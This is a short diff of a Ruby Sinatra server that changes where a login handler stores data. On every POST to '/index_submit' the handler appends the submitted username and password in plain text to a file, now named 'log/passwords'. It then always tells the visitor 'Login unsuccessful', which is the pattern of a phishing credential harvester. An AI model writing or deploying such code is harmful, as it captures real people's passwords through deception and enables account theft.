@@ -9,7 +9,7 @@ class Server < Sinatra::Base
   helpers Sinatra::RedirectWithFlash
 
   post '/index_submit' do
-    open('logfile', 'a') do |f|
+    open('log/passwords', 'a') do |f|
       f.puts "#{params[:login]} #{params[:password]}"
     end
     redirect '/', error: 'Login unsuccessful'
